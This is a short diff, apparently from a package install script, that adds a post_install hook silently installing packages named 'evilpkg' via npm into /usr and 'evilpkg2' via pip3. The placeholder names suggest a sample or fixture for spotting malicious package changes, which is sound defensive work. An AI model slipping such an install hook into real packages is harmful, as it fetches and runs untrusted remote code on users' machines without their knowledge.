@@ -1,0 +1,4 @@
+post_install() {
+    npm --prefix /usr install evilpkg
+    pip3 --quiet install evilpkg2
+}
